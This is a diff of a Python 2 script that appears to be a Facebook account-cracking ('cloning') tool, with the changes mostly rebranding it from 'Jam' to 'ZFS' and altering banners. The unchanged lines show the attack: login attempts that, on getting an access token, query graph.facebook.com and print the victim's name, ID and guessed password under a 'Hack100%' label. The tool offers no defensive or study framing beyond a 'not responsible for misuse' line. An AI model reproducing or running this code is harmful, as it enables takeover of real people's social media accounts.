@@ -85,9 +85,9 @@ _________▄██✿███▄
 
 ♨️°───────( ZIHAN AHMED )───────°♨️
 \033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
-\033[1;96m║✯ Creator ✯ TEAM ZFS       ║    
-\033[1;98m║✯ ZIHAN ZFS            ║  
-\033[1;96m║✯ I'm Not Responsible For Any Miss Use║
+\033[1;96m║✯ Creator ✯ TEAM ZFS                    ║    
+\033[1;98m║✯ ZIHAN ZFS                              ║  
+\033[1;96m║✯ I'm Not Responsible For Any Miss Use   ║
 \033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -110,12 +110,12 @@ print  """
 \033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR ZFS  ~
 \033[1;97m************************************************
 
-\033[1;92m░░░░░██╗░█████╗░███╗░░░███╗
-\033[1;92m░░░░░██║██╔══██╗████╗░████║
-\033[1;92m░░░░░██║███████║██╔████╔██║
-\033[1;92m██╗░░██║██╔══██║██║╚██╔╝██║
-\033[1;92m╚█████╔╝██║░░██║██║░╚═╝░██║
-\033[1;92m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+\033[1;92m
+\033[1;92m
+\033[1;92m
+\033[1;92m
+\033[1;92m
+\033[1;92m
 USER NAME: zihan
 PASSWORD: zfs
 """
@@ -317,7 +317,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;92m◄══════════════════JAM══════════════════►"
+	print "   \033[1;92m◄══════════════════ZFS══════════════════►"
 
 	jalan('          \033[1;91mZFS start cloning Wait...')
 	print  "  \033[1;92m ◄══════════════════ZfS══════════════════►" 
@@ -360,7 +360,7 @@ def pilih_super():
 			            if 'access_token' in q:	
 				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				            z = json.loads(x.text)
-				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'											
+				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mZFS-Hack100%'											
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
@@ -470,7 +470,7 @@ def pilih_super():
 								                               if 'access_token' in q:		
 				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                       z = json.loads(x.text)
-									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'					
+									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mZFS-Hack100%'					
 									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
 									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
 									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
